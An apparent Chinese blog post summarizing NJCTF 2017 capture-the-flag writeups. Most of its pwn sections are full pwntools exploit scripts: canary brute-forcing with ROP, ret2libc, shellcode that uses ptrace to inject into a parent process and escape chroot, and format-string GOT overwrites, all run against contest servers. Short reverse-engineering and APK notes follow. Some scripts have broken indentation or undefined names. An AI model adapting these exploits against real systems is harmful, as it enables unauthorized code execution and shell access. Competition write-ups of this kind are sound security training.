<!DOCTYPE html>
<html lang="zh-CN">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="Mr_white" />



<meta name="description" content="NJCTF上大牛们整理出来的解题思路，我给总结下。">
<meta property="og:type" content="article">
<meta property="og:title" content="NJCTF writeup总结">
<meta property="og:url" content="http://xq.dropsec.xyz/2017/03/17/NJCTF-writeup总结/index.html">
<meta property="og:site_name" content="Mr_white">
<meta property="og:description" content="NJCTF上大牛们整理出来的解题思路，我给总结下。">
<meta property="og:image" content="http://p1.bpimg.com/567571/6dc7f3040aab2ffa.png">
<meta property="og:image" content="http://p1.bqimg.com/567571/046473b938f7988b.png">
<meta property="og:image" content="http://p1.bpimg.com/567571/ea494dd756dc45e0.png">
<meta property="og:image" content="http://i1.piimg.com/567571/e5ab5b359c4835bb.png">
<meta property="og:image" content="http://i1.piimg.com/567571/f1a0b4d1c1556ff9.png">
<meta property="og:image" content="http://p1.bpimg.com/567571/c30558cf5f5a43ce.png">
<meta property="og:image" content="http://i1.piimg.com/567571/3a811f4eba481e67.png">
<meta property="og:image" content="http://i1.piimg.com/567571/9d72bb1e6aef52d8.png">
<meta property="og:image" content="http://p1.bqimg.com/567571/005c07496555a38e.png">
<meta property="og:image" content="http://p1.bqimg.com/567571/e64d0f37a40cdd03.png">
<meta property="og:image" content="http://i1.piimg.com/567571/2f2962f9ee3da6aa.png">
<meta property="og:image" content="http://i1.piimg.com/567571/94c4021b8c6d04f2.png">
<meta property="og:updated_time" content="2017-05-10T05:54:35.829Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="NJCTF writeup总结">
<meta name="twitter:description" content="NJCTF上大牛们整理出来的解题思路，我给总结下。">
<meta name="twitter:image" content="http://p1.bpimg.com/567571/6dc7f3040aab2ffa.png">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="Mr_white" type="application/atom+xml">



    <link rel="shortcut icon" href="/img/111.jpg">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>NJCTF writeup总结 | Mr_white</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script> yiliaConfig.jquery_ui = [false]; </script>



    <script> yiliaConfig.rootUrl = "\/";</script>






</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/111.jpg" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Mr_white</a></h1>
        </hgroup>

        
        <p class="header-subtitle">No Pain No Gain!</p>
        
		
        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=282324364@qq.com" title="Email"></a>
                            
                                <a class="fa 新浪微博" href="http://weibo.com/p/1005055747318462/home?from=page_100505&mod=TAB#place" title="新浪微博"></a>
                            
                                <a class="fa GitHub" href="https://github.com/wl1510009" title="GitHub"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="http://spd.dropsec.xyz/">All Right</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://yunnigu.dropsec.xyz/">YunGong</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://blog.dropsec.xyz/">Drops</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">没有可不可以，只有敢不敢做！</div>
                </section>
                
            </div>
        </div>
    </header>
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Mr_white</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/111.jpg" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Mr_white</a></h1>
            </hgroup>
            
            <p class="header-subtitle">No Pain No Gain!</p>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=282324364@qq.com" title="Email"></a>
                            
                                <a class="fa 新浪微博" target="_blank" href="http://weibo.com/p/1005055747318462/home?from=page_100505&mod=TAB#place" title="新浪微博"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/wl1510009" title="GitHub"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
</nav>
      <div class="body-wrap"><article id="post-NJCTF-writeup总结" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/03/17/NJCTF-writeup总结/" class="article-date">
      <time datetime="2017-03-17T01:34:57.000Z" itemprop="datePublished">2017-03-17</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      NJCTF writeup总结
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>NJCTF上大牛们整理出来的解题思路，我给总结下。</p>
<a id="more"></a>
<h2 id="PWN-messagner"><a href="#PWN-messagner" class="headerlink" title="###PWN-messagner"></a>###PWN-messagner</h2><p>一开始以为是ssp-leak后来发现是逐个逐个爆破cannary，然后rop就没了,本来在找rop的，结果发现出题人留了rop链在里面。</p>
<pre><code>#coding:utf-8
from pwn import * 
#__author__=&apos;simp1e&apos;
import struct
import binascii    
PROC_NAME=&apos;./messager&apos;#PORC_NAME
context.arch=&apos;i386&apos;
proc_elf=ELF(PROC_NAME)
print proc_elf.checksec()
context.log_level = &apos;debug&apos;
for i in proc_elf.libs:
    if i.find(&apos;libc.so.6&apos;)!=-1:
        LOCAL_LIBC_PATH=i
L_LIBC=ELF(LOCAL_LIBC_PATH)


def exp(io,choice,libc):
    ll=log
    global code_base
    global cookies
    ll.debug(&apos;get_libc_offset&apos;)
    for i in libc.search(&apos;/bin/sh&apos;):
        offset_bin_sh=i
        break
    offset_system=libc.symbols[&apos;system&apos;]
    offset_one_function=libc.symbols[&apos;puts&apos;]
    print &apos;[offset]&apos;
    print &apos;sys-&gt;0x%x\nbinsh-&gt;0x%x\nputs-&gt;0x%x&apos;%(offset_system,offset_bin_sh,offset_one_function)
    cookies=&apos;\x00\xc1\xa6\x43\xe3\x04\x69\xa0&apos;
    cookies=&apos;\x00\x60\x58\xd8\x67\xaa\x83\x1e&apos;#006058d867aa831e
    iip=&apos;127.0.0.1&apos;
    port=5555
    if choice==2:
        iip=&apos;218.2.197.234&apos;
        port=2090
        cookies=&apos;\x00\xa0\xd7\x1c\x73\x4e\x74\x22&apos;#00bd4af811ae0e38
    pop_rsi_2ret=0x0000000000400fb1
    pop_edi_ret=0x0000000000400fb3
    while 1:
        if len(cookies)==8:
            break
        for i in range(1,0xff):
            data=io.recv()
            #print &apos;ddd&apos;+data
            data=p64(0x602160)*13+cookies+chr(i)
            print &apos;try----%d&apos;%(i)
            &apos;&apos;&apos;
            if choice==3:
                raw_input(&apos;gdb attach!!!&apos;)
            #&apos;&apos;&apos;
            io.send(data)
            try:
                io.recv()
                cookies+=&apos;%c&apos;%(i)
                print &apos;leak-&gt;cookies-&gt;&apos;+cookies.encode(&apos;hex&apos;)
                #raw_input(&apos;---------&apos;)
                io.close()
                io=remote(iip,port)
                break
            except Exception, e:
                io.close()
                io=remote(iip,port)
                continue
            io.close()
            io=remote(iip,port)
            #io.interactive()
    #+p64(0x400eb0)+p64(0x602160)*0x1
    print &apos;0x%x&apos;%(u64(cookies))
    n_rbp=0x7ffcb0dd5a80
    dd=p64(0x602160)*13+cookies+p64(n_rbp)
    rop = ROP(PROC_NAME)
    rop.call(proc_elf.plt[&apos;send&apos;],[0x602120,0x602160,0x100,0])
    print rop.dump()
       real_rop=p64(pop_edi_ret)+p64(0x602120)+p64(pop_rsi_2ret)+p64(0x40108a)+p64(0x602160)+p64(proc_elf.plt[&apos;send&apos;])+p64(0x400)
    data=dd+p64(0x400bc6)
    #&apos;&apos;&apos;
    if choice==3:
        raw_input(&apos;gdb attach!!!&apos;)
    #&apos;&apos;&apos;

    io.sendline(data)
    io.interactive()



if __name__==&apos;__main__&apos;:
       print &apos;Press 1 to test on local\nPress 2 to remote pwn\nPress 3 to test nc on local&apos;
    try:
        choice=int(raw_input(&apos;input &gt;&apos;).strip(&apos;\n&apos;))
    except:
        print &apos;Press error,Choice default set to 1&apos;
        choice=1
    if choice==1:
        r= process(PROC_NAME)
        exp(r,choice,L_LIBC)
    elif choice==2:
        r= remote(&apos;218.2.197.234&apos; , 2090 )
        #r= process(PROC_NAME)
        try:
            R_LIBC=ELF(&apos;./remote_libc&apos;)
        except:
            R_LIBC=L_LIBC
            print &apos;Alert! remote libc no found,default set to local libc&apos;
        exp(r,choice,R_LIBC)
    elif choice==3:
        r=remote(&apos;127.0.0.1&apos;,5555)
        exp(r,choice,L_LIBC)
</code></pre><h2 id="pwn-233"><a href="#pwn-233" class="headerlink" title="###pwn-233"></a>###pwn-233</h2><p>有libc就行了，然后爆破就行，反正32嘛</p>
<pre><code>import time

from pwn import *
context.log_level = &apos;debug&apos;
libc_base = 0xf772f000#brute

offse_sys = libc_base + 0x3fe70
offse_bsh = libc_base + 0x0015da8c

def exp():
    io = remote(&apos;106.14.22.20&apos;, 23743)

    payload = &apos;c&apos;*0x16 + p32(offse_sys) + &apos;a&apos;*4 + p32(offse_bsh)
    io.sendline(payload)
    sleep(2)
    io.sendline(&apos;echo simp1e&apos;)
    d = io.recv(timeout=1)
    if &apos;simp1e&apos; not in d:
        io.close()
        return


    print &apos;!!!!!!&apos;
    io.interact()

if __name__ == &apos;__main__&apos;:
    tt=0
    while 1:
        print &apos;tyyy:%d&apos;%(tt)
        tt += 1
        try:
            exp()
        except:
            pass
</code></pre><p>NJCTF{W0W_Vd50_i5_C00L!!}</p>
<h2 id="PWN-vegas"><a href="#PWN-vegas" class="headerlink" title="###PWN-vegas"></a>###PWN-vegas</h2><p>题目不难。想到思路之后就是写脚本的事情了。</p>
<p>一个猜数字奇偶的游戏。猜对了就能向数组里写一个字节。数字的生成方式是以时间为种子生成的16个初始随机数，然后再以一个稀奇古怪的算法生成的数字。不过好在每一次猜测随机数的时候都会给出随机数的值。所以只要爆破时间种子，然后以相同的随机数生成算法来计算就能够预测随机数了</p>
<p>（我能吐槽服务器时间很本机差了大概2500秒吗?异空间中的服务器？）</p>
<p>一旦能预测随机数，这个题目就是一个简单的栈溢出了。就是在main函数结尾的时候有一句<br><img src="http://p1.bpimg.com/567571/6dc7f3040aab2ffa.png" alt=""></p>
<p>esp的值是根据ecx的值确定的。额ecx又是从栈里面pop出来的。而栈里的值因为溢出而被覆盖了。不过也不麻烦，因为<br><img src="http://p1.bqimg.com/567571/046473b938f7988b.png" alt=""></p>
<p>这个puts会把栈里面的值给输出出来。溢出的时候找好位置读取一下栈的位置就好了。</p>
<pre><code>from pwn import *
import v
import ctypes
import time


context.log_level = &apos;debug&apos;
target = process(&apos;./vegas&apos;)
#target = remote(&apos;218.2.197.235&apos;,23747)
t = [0 for i in range(16)]
s = 0xb


def init(seed):
    s = 0xb
    libc = ctypes.cdll.LoadLibrary(&apos;./libc.so.6&apos;)
    libc.srand(seed)
    for i in range(16):
    t[i] = libc.rand()


def get_ran():
    global s
    global t
    v0 = s
    v1 = t[s]
    v2 = (s+15)&amp;0xf
    v3 = t[(s+13)&amp;0xf]
    v4 = t[v2]
    v5 = t[s] &lt;&lt; 16
    v5 = v5 &amp; 0xffffffff
    s = (s+15)&amp;0xf
    v6 = v3^v5^v1^(v3&lt;&lt;15)
    v6 = v6 &amp; 0xffffffff
    v7 = t[(v0+9)&amp;0xf]^(t[(v0+9)&amp;0xf]&gt;&gt;11)
    t[(v0+10)&amp;0xf] = v7^v6
    r = ((8*(v7^v6))&amp;0xDEADBEE8)^(v7&lt;&lt;24)^(v6&lt;&lt;10)^v7^v4^(2*v4)
    r = r &amp; 0xfffffff
    t[v2] = r
    return r


def guess(i,data):
    ss = &apos;&apos;
    target.recvuntil(&apos;Choice:\n&apos;)
    target.sendline(&apos;1&apos;)
    target.recvuntil(&apos;3. Not sure\n&apos;)
    target.sendline(str(i))
    target.recvuntil(&apos;The number is &apos;)
    num = target.recvline()
    num = int(num[:-1],16)
    r = target.recvline()
    if &apos;Right&apos; in r:
        target.recvuntil(&apos;step:\n&apos;)
        target.sendline(data)
        ss = target.recvline()
    target.recvuntil(&apos;score: &apos;)
    s = target.recvline()
    s = int(s[:-1])
    return num,s,ss
def win(data):
    if get_ran()&amp;1 == 1:
        return guess(1,data)[2]
    else:
        return guess(2,data)[2]
def lose():
    if get_ran()&amp;1 == 1:
        guess(2,&apos;1&apos;)
    else:
        guess(1,&apos;1&apos;)


ran,score,tmp = guess(1,&apos;1&apos;)
seed = int(time.time())+10000
while True:
    init(seed)
    if get_ran() == ran:
        break
    else:
        seed -= 1


if score == 1:
    lose()
else:
    win(&apos;1&apos;)
elf = ELF(&apos;./vegas&apos;)
rop = ROP(elf)
rop.read(0,0x0804B0C0,16)
rop.system(0x0804B0C0)


data = &apos;a&apos;*31# + &apos;b&apos;*12 + str(rop)
for i in data:
    win(i)


addr = win(&apos;a&apos;)
print addr
raw_input()
addr = addr[32:36]
addr = u32(addr) - 20
data2 = p32(addr+4) + &apos;aaaa&apos; + p32(addr+4) + str(rop)
for i in data2:
    win(i)


target.sendline(&apos;3&apos;)
target.sendline(&apos;/bin/sh;\x00&apos;)
target.interactive()
</code></pre><h2 id="PWN-syscallhelper"><a href="#PWN-syscallhelper" class="headerlink" title="###PWN-syscallhelper"></a>###PWN-syscallhelper</h2><p>题目本身漏洞不难。主要考验写shellcode的功底。<br><img src="http://p1.bpimg.com/567571/ea494dd756dc45e0.png" alt=""></p>
<p>这里的索引可以为负数。写个-10就就可以覆盖到虚表了。覆盖虚表的指针指向的内容还是可控的。</p>
<p>首先写个指向puts指针进去，然后调用一下就可以获得到堆的地址。然后再覆盖一次虚表指向堆上的shellcode就可以了。这里有一个问题是本地和远程的堆偏移不太一样。远程因为有默认的syscall table。所以偏移和本地不一样。解决方法也很简单，直接堆喷shellcode然后稍微跑一下偏移就能解决了。</p>
<p>恩，shellcode是可以执行了。但是chroot还是个问题。写了一个列目录的shellcode，发现flag不在jail目录下。好吧，还得绕过chroot去上层目录才行。</p>
<p>写shellcode用getuid确认了远程进程的权限是root。而chroot对当前进程和其子进程是无解的。那就只能对父进程下手了。最后写个一个ptrace的shellcode。通过调试父进程，将shellcode注入父进程的方法来让父进程弹shell。最终搞到了flag。</p>
<pre><code>from pwn import *

context.log_level = &apos;debug&apos;

shellcode = &apos;&apos;

shellcode += asm(shellcraft.i386.linux.echo(&apos;123&apos;))

shellcode += asm(&apos;mov edi,[0x0804E158]&apos;)

shellcode += asm(&apos;add edi, 1&apos;)

shellcode += asm(shellcraft.i386.linux.ptrace(0x10, &apos;edi&apos;, 0,0))

shellcode += asm(shellcraft.i386.linux.push(&apos;eax&apos;))

shellcode += asm(shellcraft.i386.linux.write(1,&apos;esp&apos;,4))

shellcode += asm(shellcraft.i386.linux.waitpid(-1,0,2))

shellcode += asm(&apos;mov edi,[0x0804E158]&apos;)

shellcode += asm(&apos;add edi, 1&apos;)

shellcode += asm(shellcraft.i386.linux.ptrace(5, &apos;edi&apos;, 0x08049B0F + 4*0, 795371626))


shellcode += asm(&apos;mov edi,[0x0804E158]&apos;)

shellcode += asm(&apos;add edi, 1&apos;)

shellcode += asm(shellcraft.i386.linux.ptrace(5, &apos;edi&apos;, 0x08049B0F + 4*1, 1752379183))

shellcode += asm(&apos;mov edi,[0x0804E158]&apos;)

shellcode += asm(&apos;add edi, 1&apos;)

shellcode += asm(shellcraft.i386.linux.ptrace(5, &apos;edi&apos;, 0x08049B0F + 4*2, 1852400175))

shellcode += asm(&apos;mov edi,[0x0804E158]&apos;)

shellcode += asm(&apos;add edi, 1&apos;)

shellcode += asm(shellcraft.i386.linux.ptrace(5, &apos;edi&apos;, 0x08049B0F + 4*3, 2304248682))

shellcode += asm(&apos;mov edi,[0x0804E158]&apos;)

shellcode += asm(&apos;add edi, 1&apos;)

shellcode += asm(shellcraft.i386.linux.ptrace(5, &apos;edi&apos;, 0x08049B0F + 4*4, 2580099555))

shellcode += asm(&apos;mov edi,[0x0804E158]&apos;)

shellcode += asm(&apos;add edi, 1&apos;)

shellcode += asm(shellcraft.i386.linux.ptrace(5, &apos;edi&apos;, 0x08049B0F + 4*5, 16875725))





shellcode += asm(&apos;mov edi,[0x0804E158]&apos;)

shellcode += asm(&apos;add edi, 1&apos;)

shellcode += asm(shellcraft.i386.linux.ptrace(0x11, &apos;edi&apos;, 0, 0))

#shellcode += asm(shellcraft.i386.infloop())



#t = process(&apos;./syscallhelper&apos;)

t = remote(&apos;218.2.197.234&apos;, 2088)

def leave():

    t.recvuntil(&apos;option:\n&apos;)

    t.sendline(&apos;5&apos;)

    t.recvuntil(&apos;length\n&apos;)

    t.sendline(&apos;16384&apos;)

    t.recvuntil(&apos;message\n&apos;)

    t.sendline(&apos;\x90&apos;*(16380-len(shellcode))+shellcode)

def add(name,addr):

    t.recvuntil(&apos;option:\n&apos;)

    t.sendline(&apos;2&apos;)

    t.recvuntil(&apos;name\n&apos;)

    t.sendline(name)

    t.recvuntil(&apos;number\n&apos;)

    t.sendline(&apos;3343&apos;)

    t.recvuntil(&apos;count(argc)\n&apos;)

    t.sendline(&apos;-10&apos;)

    t.recvuntil(&apos;0 to stop\n&apos;)

    t.sendline(&apos;-10&apos;)

    t.recvuntil(&apos;value\n&apos;)

    t.sendline(p32(addr))

    t.recvuntil(&apos;0 to stop\n&apos;)

    t.sendline(&apos;0&apos;)


def call(name):

    t.recvuntil(&apos;option:\n&apos;)

    t.sendline(&apos;1&apos;)

    t.recvuntil(&apos;call name:\n&apos;)

    t.sendline(name)

    t.recvuntil(&apos;option:\n&apos;)

    t.sendline(&apos;3&apos;)

for i in range(5):

    leave()

add(&apos;explorer&apos;,0x08048D30)

call(&apos;explorer&apos;)

heap = t.recv(4)

heap = u32(heap) - 0xd0

print hex(heap)

shell = heap + 0x1 + 0x10000*3

add(&apos;explorer1&apos;,shell)

call(&apos;explorer1&apos;)

t.interactive()
</code></pre><h2 id="PWN-vsvs"><a href="#PWN-vsvs" class="headerlink" title="###PWN-vsvs"></a>###PWN-vsvs</h2><p>先爆破code，得到第一层code为22，然后有个溢出，直接传/bin/sh就能拿flag了：</p>
<pre><code>#!/usr/bin/python
# -*- coding: utf-8 -*-


from pwn import *
import time

REMOTE = 0
LOCAL_REMOTE = 1
LOCAL = 2

rhost = &quot;218.2.197.235&quot;
rport = 23749 


flag = REMOTE
debug = 0

def GetConnection():
    if flag == LOCAL_REMOTE:
        conn = remote(lhost,lport)
        libc_addr = libc_addr_local
    elif flag == REMOTE:
        conn = remote(rhost,rport)
        libc_addr = libc_addr_remote
    elif flag == LOCAL:
        conn = process(local_bin)
        libc_addr = libc_addr_local
    return conn,libc_addr


exp = 1024*&quot;d&quot; + &quot;/bin/sh&quot;
conn,libc_addr = GetConnection()
conn.sendlineafter(&quot;access code:\n&quot;,&quot;22&quot;)
conn.sendlineafter(&quot;input:&quot;,exp)
conn.sendlineafter(&quot;?&quot;,exp)
conn.interactive()
</code></pre><h2 id="PWN-pingme"><a href="#PWN-pingme" class="headerlink" title="###PWN-pingme"></a>###PWN-pingme</h2><p>又是一个没有给二进制程序的题目…首先要想办法把二进制文件dump下来。测试了一下发现存在格式化字符串漏洞</p>
<p>于是写个脚本把二进制程序给弄出来</p>
<pre><code>from pwn import *

import os

io = remote(&apos;218.2.197.235&apos;,23745)

context.log_level = &apos;debug&apos;


def get_content(addr):

    io.sendline(p32(addr) + &apos;%7$s&apos;)

    io.recvuntil(p32(addr))

    content = io.recvuntil(&apos;\n&apos;)[:-1]

    return content



io.recvuntil(&apos;Ping me\n&apos;)



fp = open(&apos;./pingme&apos;, &apos;ab+&apos;)

idx = 0x8048000 + os.path.getsize(&apos;./pingme&apos;) 

#idx = 0x8048001

#fp.write(&apos;\x7f&apos;)

while True:

    if idx &amp; 0xff == 00 or idx &amp; 0xff == 10:

        fp.write(&apos;\x00&apos;)

        idx += 1

        continue

    ans =  get_content(idx)

    if ans:

        fp.write(ans)

        idx += len(ans)

    else:

        fp.write(&apos;\x00&apos;)

        idx += 1
</code></pre><p>然后dump出来的程序不知道为什么没有plt……有点麻烦，勉强能看</p>
<p>简单的存在一个printf。直接利用这个就可以得到shell</p>
<pre><code>from pwn import *
import os


io = remote(&apos;218.2.197.235&apos;,23745)
context.log_level = &apos;info&apos;


def get_content(addr):
io.sendline(p32(addr) + &apos;%7$s&apos;)
io.recvuntil(p32(addr))
content = io.recvuntil(&apos;\n&apos;)[:-1]
return content

io.recvuntil(&apos;Ping me\n&apos;)
printf_got = 0x8049974
read_got = 0x8049978
puts_got = 0x8049980
strlen_got = 0x8049988


printf_libc = u32(get_content(printf_got)[:4])
log.info(&apos;printf :&apos; + hex(printf_libc))
read_libc = u32(get_content(read_got)[:4])
log.info(&apos;read :&apos; + hex(read_libc))
puts_libc = u32(get_content(puts_got)[:4])
log.info(&apos;puts :&apos; + hex(puts_libc))
#strchr_libc = u32(get_content(strchr_got)[:4])
#log.info(&apos;strchr :&apos; + hex(strchr_libc))


system_libc = printf_libc - 0x00049020 + 0x0003a940
print hex(system_libc)
high = (system_libc &gt;&gt; 16) &amp; 0xffff
low = (system_libc &amp; 0xffff)
print hex(high), hex(low)


#payload = &apos;%0&apos; + str((system_libc &amp; 0xffff) - 4) + &apos;x&apos; + p32(strlen_got) + &apos;%9$hn&apos;
payload  = &apos;%&apos; + str(low - 4).rjust(6, &apos;0&apos;) + &apos;x&apos; + p32(strchr_got) 
payload += &apos;%9$hn&apos;
payload += &apos;%&apos; + str(high - low - 4).rjust(5, &apos;0&apos;) + &apos;x&apos; + p32(strlen_got + 2)
payload += &apos;%13$hn&apos;
pause()
print payload
io.sendline(payload)
print io.recvuntil(&apos;\n&apos;)
io.sendline(&apos;/bin/sh &apos;)
io.interactive()
</code></pre><h2 id="RE-first"><a href="#RE-first" class="headerlink" title="###RE-first"></a>###RE-first</h2><p>首先逆向一下程序，发现是和时间有关，并且和输入有关的。我们必须得想办法确定输入才行。</p>
<p>程序创建了6个线程，每个线程对input的4位进行MD5了之后取前16位和602120位置的数值进行比较<br><img src="http://i1.piimg.com/567571/e5ab5b359c4835bb.png" alt=""><br><img src="http://i1.piimg.com/567571/f1a0b4d1c1556ff9.png" alt=""></p>
<p>我们可以解出这些md5<br>然后在比较的位置下断点，恢复这些4个字母的字符串顺序，得到应该存在的输入<br>然后就是要爆破时间<br>我们写个脚本来实现</p>
<pre><code>import lowkey
import subprocess
import time
while True:
    p = subprocess.Popen(&apos;./first&apos;, stdout=subprocess.PIPE, stdin = subprocess.PIPE)
    out, _ = p.communicate(input = b&apos;juhuhfenlapsiuerhjifdunu\n&apos;)
    if &apos;Here&apos; in out:
        print out
    time.sleep(0.1)
</code></pre><p><img src="http://p1.bpimg.com/567571/c30558cf5f5a43ce.png" alt=""></p>
<h2 id="RE-echo-sever"><a href="#RE-echo-sever" class="headerlink" title="###RE-echo sever"></a>###RE-echo sever</h2><p>这个题目比较的简单，实际上就是IDA解析的时候把数据解析成指令了。我们手动恢复一下就好了。<br>有个strncmp的比较，比较下输入是不是F1@gA，是的话就输出这个字符串的md5。<br>输出的MD5就是flag</p>
<h2 id="RE-on-the-fly"><a href="#RE-on-the-fly" class="headerlink" title="###RE-on the fly"></a>###RE-on the fly</h2><p>是一个用d语言写的程序<br>找这样一个脚本，跑一下就能得到结果<br><a href="https://github.com/ctfs/write-ups-2016/blob/master/csaw-ctf-2016-quals/reverse/deedeedee-150/solve.py" target="_blank" rel="external">https://github.com/ctfs/write-ups-2016/blob/master/csaw-ctf-2016-quals/reverse/deedeedee-150/solve.py</a><br><img src="http://i1.piimg.com/567571/3a811f4eba481e67.png" alt=""></p>
<p>一共两个Activity，逻辑类似，通过对传入的参数进行计算，直接遍历</p>
<h2 id="apk-safebox"><a href="#apk-safebox" class="headerlink" title="###apk-safebox"></a>###apk-safebox</h2><p>apk改之理解析出源代码最后看算法写出爆破脚本即可。</p>
<pre><code>for i in xrange(10000000,99999999):
    i1 = 10000000
    j=1
    n=1
    if ((abs(i / 1000 % 100-36 ) == 3) &amp; (i % 1000 % 584 == 0)):
            for k in (0,3):
            if (i / j % 10 == i / i1 % 10):
                for c1 in xrange(48,122):
                    for c2 in xrange(48,122):
                        for c3 in xrange(48,122):
                            if((c3 == i / 1000000)&amp;(c2 == i / 10000 % 100)&amp;(c1 == i / 100 % 100+10)):
                                print (c3)
                                print (c2)
                                print (c1)
        j=j*10
        i1=i1/10
</code></pre><h2 id="apk-LittleRotatorGame"><a href="#apk-LittleRotatorGame" class="headerlink" title="###apk-LittleRotatorGame"></a>###apk-LittleRotatorGame</h2><p>临时学 科学上网:<a href="https://developer.android.com/reference/android/app/NativeActivity.html" target="_blank" rel="external">https://developer.android.com/reference/android/app/NativeActivity.html </a></p>
<p>从android_main函数的前面代码看出，这就是官网给的样例，通过获取的加速度传感器的数据然后搞搞搞 在调用模式下看到一堆的块以及各种调用看出这是用了O-LLVM混淆 各种摸索下，发现获取的传感器数据会传入 a_process(int, int, int)<br><img src="http://i1.piimg.com/567571/9d72bb1e6aef52d8.png" alt=""><br>然后把返回值存到R7进行对比某值 跟入 ，发现该函数返回的值取值在 之间 再看后面对比的地方</p>
<pre><code>.rodata:0000785C ; signed int *dword_785C[10]
.rodata:0000785C dword_785C DCD 2, 7, 5, 3, 2, 9, 4, 1, 3, 6 
</code></pre><p>也就是说在获取到传感器的数据后，会调用<code>a_process</code>函数进行处理然后将返回值跟一数组的值进行对比，一共10个数字，也就是会对比10次，但是有一个问题， 获取的数字在 之间，而对比的数组有7和9,</p>
<p>此时我们注意到边上还有一个<code>b_process</code>，查看调用</p>
<p><img src="http://p1.bqimg.com/567571/005c07496555a38e.png" alt=""></p>
<p>前面在调用 a_process 的时候将返回值存储在R7，这里会在调用完后进行判断，如果返回值是6，会调用b_process 虽然中间隔得有点远</p>
